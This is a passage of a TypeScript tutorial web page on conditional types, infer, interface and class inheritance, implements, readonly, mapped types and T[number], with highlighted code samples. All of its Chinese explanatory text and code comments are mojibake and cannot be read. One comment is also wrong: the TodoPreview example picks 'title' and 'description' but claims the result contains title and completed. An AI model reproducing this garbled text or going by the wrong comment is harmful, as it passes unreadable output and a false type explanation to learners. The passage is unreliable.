<li>æ¡ä»¶ç±»å‹ï¼šç±»å‹ç‰ˆ <strong>ä¸‰å…ƒè¿ç®—ç¬¦</strong></li>
</ol>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-comment">// åŸºç¡€ç¤ºä¾‹ï¼šåˆ¤æ–­ç±»å‹æ˜¯å¦ä¸ºå­—ç¬¦ä¸²</span>
<span class="hljs-keyword">type</span> <span class="hljs-title class_">IsString</span>&lt;T&gt; = T <span class="hljs-keyword">extends</span> <span class="hljs-built_in">string</span> ? <span class="hljs-literal">true</span> : <span class="hljs-literal">false</span>;

<span class="hljs-keyword">type</span> A = <span class="hljs-title class_">IsString</span>&lt;<span class="hljs-string">"test"</span>&gt;; <span class="hljs-comment">// trueï¼ˆç¬¦åˆï¼‰</span>
<span class="hljs-keyword">type</span> B = <span class="hljs-title class_">IsString</span>&lt;<span class="hljs-number">123</span>&gt;; <span class="hljs-comment">// falseï¼ˆä¸ç¬¦åˆï¼‰</span>
</code></pre>
<p>åˆ†å¸ƒå¼æ¡ä»¶ç±»å‹ï¼ˆè”åˆç±»å‹ä¸“ç”¨ï¼‰: å½“ <code>T</code> æ˜¯è”åˆç±»å‹æ—¶ï¼Œ<code>extends</code> ä¼šè‡ªåŠ¨æ‹†åˆ†è”åˆç±»å‹çš„æ¯ä¸ªæˆå‘˜ï¼Œé€ä¸ªåˆ¤æ–­åå†åˆå¹¶ç»“æœã€‚</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">type</span> <span class="hljs-title class_">Union</span> = <span class="hljs-built_in">string</span> | <span class="hljs-built_in">number</span> | <span class="hljs-built_in">boolean</span>;

<span class="hljs-comment">// æ‹†åˆ†é€»è¾‘ï¼šstringâ†’stringï¼Œnumberâ†’neverï¼Œbooleanâ†’never â†’ åˆå¹¶ä¸º string</span>
<span class="hljs-keyword">type</span> <span class="hljs-title class_">OnlyString</span>&lt;T&gt; = T <span class="hljs-keyword">extends</span> <span class="hljs-built_in">string</span> ? T : <span class="hljs-built_in">never</span>;
<span class="hljs-keyword">type</span> <span class="hljs-title class_">Result</span> = <span class="hljs-title class_">OnlyString</span>&lt;<span class="hljs-title class_">Union</span>&gt;; <span class="hljs-comment">// Result = string</span>
</code></pre>
<p>æ³¨æ„ï¼šåªæœ‰æ³›å‹å‚æ•°æ˜¯ è£¸ç±»å‹ï¼ˆæ²¡æœ‰è¢« []/{} åŒ…è£¹ï¼‰æ—¶ï¼Œæ‰ä¼šè§¦å‘åˆ†å¸ƒå¼åˆ¤æ–­ï¼š</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-comment">// åŒ…è£¹åä¸è§¦å‘åˆ†å¸ƒå¼ï¼Œæ•´ä½“åˆ¤æ–­ [string|number] æ˜¯å¦å…¼å®¹ [string]</span>
<span class="hljs-keyword">type</span> <span class="hljs-title class_">NoDist</span>&lt;T&gt; = [T] <span class="hljs-keyword">extends</span> [<span class="hljs-built_in">string</span>] ? T : <span class="hljs-built_in">never</span>;
<span class="hljs-keyword">type</span> <span class="hljs-title class_">Result2</span> = <span class="hljs-title class_">NoDist</span>&lt;<span class="hljs-title class_">Union</span>&gt;; <span class="hljs-comment">// neverï¼ˆæ•´ä½“ä¸å…¼å®¹ï¼‰</span>
</code></pre>
<ol start="3">
<li>é…åˆ <code>infer</code>ï¼šæå–ç±»å‹ç‰‡æ®µï¼ˆé»„é‡‘ç»„åˆï¼‰</li>
</ol>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-comment">// æå– Promise çš„è¿”å›å€¼ç±»å‹</span>
<span class="hljs-keyword">type</span> <span class="hljs-title class_">UnwrapPromise</span>&lt;T&gt; = T <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Promise</span>&lt;infer V&gt; ? V : T;

<span class="hljs-keyword">type</span> C = <span class="hljs-title class_">UnwrapPromise</span>&lt;<span class="hljs-title class_">Promise</span>&lt;<span class="hljs-built_in">string</span>&gt;&gt;; <span class="hljs-comment">// stringï¼ˆæå–æˆåŠŸï¼‰</span>
<span class="hljs-keyword">type</span> D = <span class="hljs-title class_">UnwrapPromise</span>&lt;<span class="hljs-built_in">number</span>&gt;; <span class="hljs-comment">// numberï¼ˆä¸æ»¡è¶³æ¡ä»¶ï¼Œè¿”å›åŸç±»å‹ï¼‰</span>
</code></pre>
<h5 data-id="heading-6"><code>extends</code> åšç»§æ‰¿ï¼ˆå¤ç”¨å·²æœ‰ç»“æ„ï¼‰</h5>
<ol>
<li>æ¥å£ç»§æ‰¿ï¼šå¤ç”¨ + æ‰©å±•å±æ€§</li>
</ol>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-comment">// åŸºç¡€æ¥å£</span>
<span class="hljs-keyword">interface</span> <span class="hljs-title class_">User</span> {
  <span class="hljs-attr">id</span>: <span class="hljs-built_in">number</span>;
  <span class="hljs-attr">name</span>: <span class="hljs-built_in">string</span>;
}

<span class="hljs-comment">// ç»§æ‰¿ Userï¼Œå¹¶æ‰©å±•æ–°å±æ€§</span>
<span class="hljs-keyword">interface</span> <span class="hljs-title class_">Admin</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">User</span> {
  <span class="hljs-attr">role</span>: <span class="hljs-string">"admin"</span> | <span class="hljs-string">"super_admin"</span>; <span class="hljs-comment">// æ–°å¢æƒé™å±æ€§</span>
}

<span class="hljs-comment">// å¿…é¡»åŒ…å«ç»§æ‰¿çš„ + æ‰©å±•çš„æ‰€æœ‰å±æ€§</span>
<span class="hljs-keyword">const</span> <span class="hljs-attr">admin</span>: <span class="hljs-title class_">Admin</span> = {
  <span class="hljs-attr">id</span>: <span class="hljs-number">1</span>,
  <span class="hljs-attr">name</span>: <span class="hljs-string">"å¼ ä¸‰"</span>,
  <span class="hljs-attr">role</span>: <span class="hljs-string">"admin"</span>
};

<span class="hljs-comment">// å¤šæ¥å£ç»§æ‰¿</span>
<span class="hljs-keyword">interface</span> <span class="hljs-title class_">HasAge</span> { <span class="hljs-attr">age</span>: <span class="hljs-built_in">number</span>; }
<span class="hljs-keyword">interface</span> <span class="hljs-title class_">Student</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">User</span>, <span class="hljs-title class_">HasAge</span> {
  <span class="hljs-attr">className</span>: <span class="hljs-built_in">string</span>; <span class="hljs-comment">// åŒæ—¶ç»§æ‰¿ User + HasAge</span>
}
</code></pre>
<ol start="2">
<li>ç±»ç»§æ‰¿ï¼šå¤ç”¨çˆ¶ç±»çš„å±æ€§ / æ–¹æ³•</li>
</ol>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Parent</span> {
  <span class="hljs-attr">name</span>: <span class="hljs-built_in">string</span>;
  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">name: <span class="hljs-built_in">string</span></span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;
  }
  <span class="hljs-title function_">sayHi</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`Hi, <span class="hljs-subst">${<span class="hljs-variable language_">this</span>.name}</span>`</span>);
  }
}

<span class="hljs-comment">// ç»§æ‰¿ Parent ç±»</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">Child</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_ inherited__">Parent</span> {
  <span class="hljs-attr">age</span>: <span class="hljs-built_in">number</span>;
  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">name: <span class="hljs-built_in">string</span>, age: <span class="hljs-built_in">number</span></span>) {
    <span class="hljs-variable language_">super</span>(name); <span class="hljs-comment">// å¿…é¡»è°ƒç”¨çˆ¶ç±»æ„é€ å‡½æ•°ï¼ˆåˆå§‹åŒ–çˆ¶ç±»å±æ€§ï¼‰</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">age</span> = age;
  }
  <span class="hljs-comment">// é‡å†™çˆ¶ç±»æ–¹æ³•</span>
  <span class="hljs-title function_">sayHi</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">super</span>.<span class="hljs-title function_">sayHi</span>(); <span class="hljs-comment">// è°ƒç”¨çˆ¶ç±»åŸæ–¹æ³•</span>
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`I'm <span class="hljs-subst">${<span class="hljs-variable language_">this</span>.age}</span> years old`</span>);
  }
}

<span class="hljs-keyword">const</span> child = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Child</span>(<span class="hljs-string">"æå››"</span>, <span class="hljs-number">10</span>);
child.<span class="hljs-title function_">sayHi</span>(); <span class="hljs-comment">// è¾“å‡ºï¼šHi, æå›› â†’ I'm 10 years old</span>
</code></pre>
<p>è¡¥å……ï¼šç±»å®ç°æ¥å£ç”¨ <code>implements</code>ï¼ˆä¸æ˜¯ <code>extends</code>ï¼‰</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-comment">// å®šä¹‰æ¥å£ï¼ˆå¥‘çº¦ï¼šè§„å®šå¿…é¡»æœ‰ idã€name å±æ€§ï¼Œä»¥åŠ greet æ–¹æ³•ï¼‰</span>
<span class="hljs-keyword">interface</span> <span class="hljs-title class_">Person</span> {
  <span class="hljs-attr">id</span>: <span class="hljs-built_in">number</span>;
  <span class="hljs-attr">name</span>: <span class="hljs-built_in">string</span>;
  <span class="hljs-title function_">greet</span>(): <span class="hljs-built_in">void</span>; <span class="hljs-comment">// ä»…å®šä¹‰æ–¹æ³•ç­¾åï¼Œæ— å®ç°</span>
}

<span class="hljs-comment">// ç±»å®ç°æ¥å£ï¼ˆå¿…é¡»ä¸¥æ ¼éµå®ˆå¥‘çº¦ï¼‰</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">Employee</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Person</span> {
  <span class="hljs-comment">// å¿…é¡»å®ç°æ¥å£çš„æ‰€æœ‰å±æ€§</span>
  <span class="hljs-attr">id</span>: <span class="hljs-built_in">number</span>;
  <span class="hljs-attr">name</span>: <span class="hljs-built_in">string</span>;

  <span class="hljs-comment">// æ„é€ å‡½æ•°åˆå§‹åŒ–å±æ€§</span>
  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">id: <span class="hljs-built_in">number</span>, name: <span class="hljs-built_in">string</span></span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">id</span> = id;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;
  }

  <span class="hljs-comment">// å¿…é¡»å®ç°æ¥å£çš„ greet æ–¹æ³•ï¼ˆå…·ä½“å®ç°ç”±ç±»è‡ªå·±å®šä¹‰ï¼‰</span>
  <span class="hljs-title function_">greet</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`Hi, I'm <span class="hljs-subst">${<span class="hljs-variable language_">this</span>.name}</span>, ID: <span class="hljs-subst">${<span class="hljs-variable language_">this</span>.id}</span>`</span>);
  }
}

<span class="hljs-comment">// å®ä¾‹åŒ–ä½¿ç”¨</span>
<span class="hljs-keyword">const</span> emp = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Employee</span>(<span class="hljs-number">1</span>, <span class="hljs-string">"å¼ ä¸‰"</span>);
emp.<span class="hljs-title function_">greet</span>(); <span class="hljs-comment">// è¾“å‡ºï¼šHi, I'm å¼ ä¸‰, ID: 1</span>


<span class="hljs-comment">// æ¥å£1ï¼šåŸºç¡€ä¿¡æ¯</span>
<span class="hljs-keyword">interface</span> <span class="hljs-title class_">Identifiable</span> {
  <span class="hljs-attr">id</span>: <span class="hljs-built_in">number</span>;
  <span class="hljs-title function_">getId</span>(): <span class="hljs-built_in">number</span>;
}

<span class="hljs-comment">// æ¥å£2ï¼šå¯æ‰“å°</span>
<span class="hljs-keyword">interface</span> <span class="hljs-title class_">Printable</span> {
  <span class="hljs-title function_">printInfo</span>(): <span class="hljs-built_in">void</span>;
}

<span class="hljs-comment">// ç±»åŒæ—¶å®ç°ä¸¤ä¸ªæ¥å£ï¼ˆå¿…é¡»å®ç°æ‰€æœ‰æ¥å£çš„æˆå‘˜ï¼‰</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">Product</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Identifiable</span>, <span class="hljs-title class_">Printable</span> {
  <span class="hljs-attr">id</span>: <span class="hljs-built_in">number</span>;
  <span class="hljs-attr">name</span>: <span class="hljs-built_in">string</span>; <span class="hljs-comment">// ç±»å¯æ‰©å±•æ¥å£å¤–çš„å±æ€§</span>

  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">id: <span class="hljs-built_in">number</span>, name: <span class="hljs-built_in">string</span></span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">id</span> = id;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;
  }

  <span class="hljs-comment">// å®ç° Identifiable çš„æ–¹æ³•</span>
  <span class="hljs-title function_">getId</span>(): <span class="hljs-built_in">number</span> {
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">id</span>;
  }

  <span class="hljs-comment">// å®ç° Printable çš„æ–¹æ³•</span>
  <span class="hljs-title function_">printInfo</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`Product: <span class="hljs-subst">${<span class="hljs-variable language_">this</span>.name}</span>, ID: <span class="hljs-subst">${<span class="hljs-variable language_">this</span>.getId()}</span>`</span>);
  }
}

<span class="hljs-keyword">const</span> product = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Product</span>(<span class="hljs-number">100</span>, <span class="hljs-string">"æ‰‹æœº"</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(product.<span class="hljs-title function_">getId</span>()); <span class="hljs-comment">// 100</span>
product.<span class="hljs-title function_">printInfo</span>(); <span class="hljs-comment">// Product: æ‰‹æœº, ID: 100</span>
</code></pre>
<h4 data-id="heading-7"><code>readonly</code></h4>
<ul>
<li>æ ¸å¿ƒä½œç”¨ï¼šæ ‡è®°åï¼Œç›®æ ‡ï¼ˆå±æ€§ / æ•°ç»„ / å…ƒç»„ï¼‰åªèƒ½åœ¨åˆå§‹åŒ–é˜¶æ®µèµ‹å€¼ï¼ˆæ¯”å¦‚æ¥å£å®ä¾‹åŒ–ã€ç±»æ„é€ å‡½æ•°ã€å˜é‡å£°æ˜æ—¶ï¼‰ï¼Œåç»­ä»»ä½•ä¿®æ”¹è¿ç®—éƒ½ä¼šè¢« TS ç¼–è¯‘å™¨æ‹¦æˆªæŠ¥é”™ï¼›</li>
<li>è¿è¡Œæ—¶ç‰¹æ€§ï¼š<code>readonly</code> ä»…åšç¼–è¯‘æ—¶æ£€æŸ¥ï¼Œä¸ä¼šç”Ÿæˆä»»ä½•é¢å¤– JS ä»£ç ï¼Œä¹Ÿæ— æ³•çœŸæ­£é˜»æ­¢è¿è¡Œæ—¶çš„ä¿®æ”¹ï¼ˆæ¯”å¦‚é€šè¿‡ç±»å‹æ–­è¨€ç»•å¼€çš„è¯ï¼Œè¿è¡Œæ—¶ä»èƒ½æ”¹ï¼‰ï¼›</li>
<li>ä¸ <code>const</code> çš„åŒºåˆ«ï¼š<code>const</code> æ˜¯å˜é‡å±‚é¢çš„ä¸å¯é‡æ–°èµ‹å€¼ï¼ˆä½†å˜é‡æŒ‡å‘çš„å¯¹è±¡ / æ•°ç»„å†…éƒ¨å±æ€§ä»å¯æ”¹ï¼‰ï¼Œ<code>readonly</code> æ˜¯å±æ€§ / ç±»å‹å±‚é¢çš„ä¸å¯ä¿®æ”¹ï¼ˆå˜é‡æœ¬èº«å¯é‡æ–°èµ‹å€¼ï¼Œé™¤éå˜é‡ä¹Ÿç”¨ <code>const</code>ï¼‰ã€‚</li>
</ul>
<p>å¸¸ç”¨ä½¿ç”¨åœºæ™¯ï¼š</p>
<ol>
<li>ä½œç”¨äºæ¥å£ / ç±»å‹åˆ«åçš„å±æ€§ï¼ˆæœ€åŸºç¡€ï¼‰</li>
</ol>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-comment">// å®šä¹‰å¸¦åªè¯»å±æ€§çš„æ¥å£</span>
<span class="hljs-keyword">interface</span> <span class="hljs-title class_">User</span> {
  <span class="hljs-keyword">readonly</span> <span class="hljs-attr">id</span>: <span class="hljs-built_in">number</span>; <span class="hljs-comment">// åªè¯»å±æ€§ï¼šåªèƒ½åˆå§‹åŒ–èµ‹å€¼ï¼Œåç»­ä¸å¯æ”¹</span>
  <span class="hljs-attr">name</span>: <span class="hljs-built_in">string</span>; <span class="hljs-comment">// æ™®é€šå±æ€§ï¼šå¯ä¿®æ”¹</span>
}

<span class="hljs-comment">// åˆå§‹åŒ–æ—¶èµ‹å€¼ï¼ˆåˆæ³•ï¼‰</span>
<span class="hljs-keyword">const</span> <span class="hljs-attr">user</span>: <span class="hljs-title class_">User</span> = { <span class="hljs-attr">id</span>: <span class="hljs-number">1</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">"å¼ ä¸‰"</span> };

<span class="hljs-comment">// å°è¯•ä¿®æ”¹åªè¯»å±æ€§ï¼ˆæŠ¥é”™ï¼‰</span>
user.<span class="hljs-property">id</span> = <span class="hljs-number">2</span>; <span class="hljs-comment">// âŒ æŠ¥é”™ï¼šæ— æ³•åˆ†é…åˆ° "id"ï¼Œå› ä¸ºå®ƒæ˜¯åªè¯»å±æ€§</span>
<span class="hljs-comment">// ä¿®æ”¹æ™®é€šå±æ€§ï¼ˆåˆæ³•ï¼‰</span>
user.<span class="hljs-property">name</span> = <span class="hljs-string">"æå››"</span>; <span class="hljs-comment">// âœ… åˆæ³•</span>
</code></pre>
<ol start="2">
<li>ä½œç”¨äºç±»çš„å±æ€§: ç±»ä¸­ä½¿ç”¨ <code>readonly</code> æ ‡è®°å±æ€§ï¼Œåªèƒ½åœ¨<strong>å£°æ˜æ—¶</strong>æˆ–<strong>æ„é€ å‡½æ•°ä¸­</strong>èµ‹å€¼ï¼Œåç»­æ— æ³•ä¿®æ”¹</li>
</ol>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span> {
  <span class="hljs-keyword">readonly</span> <span class="hljs-attr">id</span>: <span class="hljs-built_in">number</span>; <span class="hljs-comment">// åªè¯»å±æ€§</span>
  <span class="hljs-attr">name</span>: <span class="hljs-built_in">string</span>;

  <span class="hljs-comment">// æ„é€ å‡½æ•°ä¸­ç»™ readonly å±æ€§èµ‹å€¼ï¼ˆå”¯ä¸€åˆæ³•çš„åç»­èµ‹å€¼æ–¹å¼ï¼‰</span>
  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">id: <span class="hljs-built_in">number</span>, name: <span class="hljs-built_in">string</span></span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">id</span> = id;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;
  }

  <span class="hljs-title function_">updateInfo</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">id</span> = <span class="hljs-number">100</span>; <span class="hljs-comment">// âŒ æŠ¥é”™ï¼šid æ˜¯åªè¯»å±æ€§</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = <span class="hljs-string">"ç‹äº”"</span>; <span class="hljs-comment">// âœ… åˆæ³•</span>
  }
}

<span class="hljs-keyword">const</span> person = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-number">1</span>, <span class="hljs-string">"èµµå…­"</span>);
person.<span class="hljs-property">id</span> = <span class="hljs-number">2</span>; <span class="hljs-comment">// âŒ æŠ¥é”™ï¼šåªè¯»å±æ€§ä¸å¯ä¿®æ”¹</span>
</code></pre>
<ol start="3">
<li>ä½œç”¨äºæ•°ç»„ / å…ƒç»„ï¼ˆåªè¯»æ•°ç»„ï¼‰: <code>readonly</code> å¯æ ‡è®°æ•°ç»„ä¸º â€œåªè¯»æ•°ç»„â€ï¼Œç¦æ­¢ä¿®æ”¹æ•°ç»„å…ƒç´ ã€è°ƒç”¨ <code>push/pop</code> ç­‰ä¿®æ”¹æ–¹æ³•</li>
</ol>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-comment">// æ–¹å¼1ï¼šä½¿ç”¨ readonly ä¿®é¥°æ•°ç»„ç±»å‹</span>
<span class="hljs-keyword">const</span> <span class="hljs-attr">arr1</span>: <span class="hljs-keyword">readonly</span> <span class="hljs-built_in">number</span>[] = [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>];
arr1.<span class="hljs-title function_">push</span>(<span class="hljs-number">4</span>); <span class="hljs-comment">// âŒ æŠ¥é”™ï¼šreadonly æ•°ç»„ä¸å­˜åœ¨ push æ–¹æ³•</span>
arr1[<span class="hljs-number">0</span>] = <span class="hljs-number">10</span>; <span class="hljs-comment">// âŒ æŠ¥é”™ï¼šæ— æ³•ä¿®æ”¹åªè¯»æ•°ç»„çš„å…ƒç´ </span>

<span class="hljs-comment">// æ–¹å¼2ï¼šä½¿ç”¨ ReadonlyArray&lt;T&gt; ç±»å‹ï¼ˆç­‰ä»·äº readonly T[]ï¼‰</span>
<span class="hljs-keyword">const</span> <span class="hljs-attr">arr2</span>: <span class="hljs-title class_">ReadonlyArray</span>&lt;<span class="hljs-built_in">string</span>&gt; = [<span class="hljs-string">"a"</span>, <span class="hljs-string">"b"</span>];
arr2.<span class="hljs-title function_">pop</span>(); <span class="hljs-comment">// âŒ æŠ¥é”™</span>

<span class="hljs-comment">// ä½œç”¨äºå…ƒç»„ï¼ˆåªè¯»å…ƒç»„ï¼‰</span>
<span class="hljs-keyword">type</span> <span class="hljs-title class_">Point</span> = <span class="hljs-keyword">readonly</span> [<span class="hljs-built_in">number</span>, <span class="hljs-built_in">number</span>];
<span class="hljs-keyword">const</span> <span class="hljs-attr">point</span>: <span class="hljs-title class_">Point</span> = [<span class="hljs-number">10</span>, <span class="hljs-number">20</span>];
point[<span class="hljs-number">0</span>] = <span class="hljs-number">30</span>; <span class="hljs-comment">// âŒ æŠ¥é”™ï¼šåªè¯»å…ƒç»„å…ƒç´ ä¸å¯ä¿®æ”¹</span>
</code></pre>
<ol start="4">
<li>ç»“åˆ <code>keyof</code> + <code>in</code> æ‰¹é‡åˆ›å»ºåªè¯»ç±»å‹ï¼ˆæ˜ å°„ç±»å‹ï¼‰</li>
</ol>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">interface</span> <span class="hljs-title class_">Product</span> {
  <span class="hljs-attr">name</span>: <span class="hljs-built_in">string</span>;
  <span class="hljs-attr">price</span>: <span class="hljs-built_in">number</span>;
  <span class="hljs-attr">stock</span>: <span class="hljs-built_in">number</span>;
}

<span class="hljs-comment">// æ‰¹é‡åˆ›å»ºåªè¯»ç‰ˆæœ¬çš„ Productï¼ˆTS å†…ç½®çš„ Readonly&lt;T&gt; å°±æ˜¯è¿™ä¹ˆå®ç°çš„ï¼‰</span>
<span class="hljs-keyword">type</span> <span class="hljs-title class_">ReadonlyProduct</span> = {
  <span class="hljs-keyword">readonly</span> [K <span class="hljs-keyword">in</span> keyof <span class="hljs-title class_">Product</span>]: <span class="hljs-title class_">Product</span>[K];
};

<span class="hljs-keyword">const</span> <span class="hljs-attr">product</span>: <span class="hljs-title class_">ReadonlyProduct</span> = { <span class="hljs-attr">name</span>: <span class="hljs-string">"æ‰‹æœº"</span>, <span class="hljs-attr">price</span>: <span class="hljs-number">2999</span>, <span class="hljs-attr">stock</span>: <span class="hljs-number">100</span> };
product.<span class="hljs-property">price</span> = <span class="hljs-number">3999</span>; <span class="hljs-comment">// âŒ æŠ¥é”™ï¼šprice æ˜¯åªè¯»å±æ€§</span>

<span class="hljs-comment">// TS å†…ç½®äº† Readonly&lt;T&gt;ï¼Œå¯ç›´æ¥ä½¿ç”¨ï¼ˆæ— éœ€æ‰‹åŠ¨å†™æ˜ å°„ç±»å‹ï¼‰</span>
<span class="hljs-keyword">const</span> <span class="hljs-attr">product2</span>: <span class="hljs-title class_">Readonly</span>&lt;<span class="hljs-title class_">Product</span>&gt; = { <span class="hljs-attr">name</span>: <span class="hljs-string">"ç”µè„‘"</span>, <span class="hljs-attr">price</span>: <span class="hljs-number">5999</span>, <span class="hljs-attr">stock</span>: <span class="hljs-number">50</span> };
product2.<span class="hljs-property">stock</span> = <span class="hljs-number">60</span>; <span class="hljs-comment">// âŒ æŠ¥é”™</span>
</code></pre>
<ol start="5">
<li>åªè¯»ç´¢å¼•ç­¾åï¼šå¦‚æœç±»å‹ä½¿ç”¨ç´¢å¼•ç­¾åï¼Œä¹Ÿå¯ä»¥æ ‡è®°ä¸º <code>readonly</code>ï¼Œç¦æ­¢é€šè¿‡ç´¢å¼•ä¿®æ”¹å±æ€§</li>
</ol>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-comment">// åªè¯»ç´¢å¼•ç­¾åï¼šåªèƒ½è¯»å–ï¼Œä¸èƒ½ä¿®æ”¹</span>
<span class="hljs-keyword">type</span> <span class="hljs-title class_">ReadonlyDict</span> = {
  <span class="hljs-keyword">readonly</span> [<span class="hljs-attr">key</span>: <span class="hljs-built_in">string</span>]: <span class="hljs-built_in">number</span>;
};

<span class="hljs-keyword">const</span> <span class="hljs-attr">dict</span>: <span class="hljs-title class_">ReadonlyDict</span> = { <span class="hljs-attr">a</span>: <span class="hljs-number">1</span>, <span class="hljs-attr">b</span>: <span class="hljs-number">2</span> };
dict[<span class="hljs-string">"a"</span>] = <span class="hljs-number">3</span>; <span class="hljs-comment">// âŒ æŠ¥é”™ï¼šç´¢å¼•ç­¾åæ˜¯åªè¯»çš„</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(dict[<span class="hljs-string">"b"</span>]); <span class="hljs-comment">// âœ… åˆæ³•ï¼šä»…è¯»å–</span>
</code></pre>
<h4 data-id="heading-8"><code>in</code></h4>
<p><code>in</code> è¿ç®—ç¬¦ç”¨äºéå†è”åˆç±»å‹ä¸­çš„æ¯ä¸ªæˆå‘˜ï¼Œå°†å…¶è½¬æ¢ä¸ºæ˜ å°„ç±»å‹çš„å±æ€§åã€‚</p>
<p>ä¾‹å¦‚ï¼š</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">interface</span> <span class="hljs-title class_">Todo</span> {
  <span class="hljs-attr">title</span>: <span class="hljs-built_in">string</span>
  <span class="hljs-attr">description</span>: <span class="hljs-built_in">string</span>
  <span class="hljs-attr">completed</span>: <span class="hljs-built_in">boolean</span>
}

<span class="hljs-keyword">type</span> <span class="hljs-title class_">TodoKeys</span> = <span class="hljs-string">'title'</span> | <span class="hljs-string">'description'</span>

<span class="hljs-keyword">type</span> <span class="hljs-title class_">TodoPreview</span> = {
  [P <span class="hljs-keyword">in</span> <span class="hljs-title class_">TodoKeys</span>]: <span class="hljs-title class_">Todo</span>[P]
}
<span class="hljs-comment">// TodoPreview ç±»å‹ä¸ºï¼š</span>
<span class="hljs-comment">// {</span>
<span class="hljs-comment">//   title: string</span>
<span class="hljs-comment">//   completed: boolean</span>
<span class="hljs-comment">// }</span>
</code></pre>
<h4 data-id="heading-9"><code>T[number]</code></h4>
<p><code>T[number]</code> ç´¢å¼•è®¿é—®ç±»å‹ ç”¨äº ä»æ•°ç»„ç±»å‹ / å…ƒç»„ç±»å‹ä¸­æå–æ‰€æœ‰å…ƒç´ çš„ç±»å‹ï¼Œæœ€ç»ˆå¾—åˆ°ä¸€ä¸ªè”åˆç±»å‹ã€‚</p>
<ol>
<li>æ™®é€šæ•°ç»„ç±»å‹</li>
</ol>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-comment">// å®šä¹‰æ™®é€šæ•°ç»„ç±»å‹</span>
<span class="hljs-keyword">type</span> <span class="hljs-title class_">StringArr</span> = <span class="hljs-built_in">string</span>[];
<span class="hljs-keyword">type</span> <span class="hljs-title class_">NumberArr</span> = <span class="hljs-built_in">number</span>[];
<span class="hljs-keyword">type</span> <span class="hljs-title class_">BoolArr</span> = <span class="hljs-built_in">boolean</span>[];

<span class="hljs-comment">// T[number] æå–å…ƒç´ ç±»å‹</span>
<span class="hljs-keyword">type</span> <span class="hljs-title class_">Str</span> = <span class="hljs-title class_">StringArr</span>[<span class="hljs-built_in">number</span>]; <span class="hljs-comment">// ç»“æœï¼šstring</span>
<span class="hljs-keyword">type</span> <span class="hljs-title class_">Num</span> = <span class="hljs-title class_">NumberArr</span>[<span class="hljs-built_in">number</span>]; <span class="hljs-comment">// ç»“æœï¼šnumber</span>
<span class="hljs-keyword">type</span> <span class="hljs-title class_">Bool</span> = <span class="hljs-title class_">BoolArr</span>[<span class="hljs-built_in">number</span>]; <span class="hljs-comment">// ç»“æœï¼šboolean</span>

<span class="hljs-comment">// ç­‰ä»·äºç›´æ¥æ³¨è§£ç±»å‹</span>
<span class="hljs-keyword">let</span> <span class="hljs-attr">s</span>: <span class="hljs-title class_">Str</span> = <span class="hljs-string">"hello"</span>; <span class="hljs-comment">// ç­‰åŒäº let s: string</span>
<span class="hljs-keyword">let</span> <span class="hljs-attr">n</span>: <span class="hljs-title class_">Num</span> = <span class="hljs-number">123</span>;    <span class="hljs-comment">// ç­‰åŒäº let n: number</span>
<span class="hljs-keyword">let</span> <span class="hljs-attr">b</span>: <span class="hljs-title class_">Bool</span> = <span class="hljs-literal">true</span>;  <span class="hljs-comment">// ç­‰åŒäº let b: boolean</span>
</code></pre>
<ol start="2">
<li>å…ƒç»„ç±»å‹</li>
</ol>
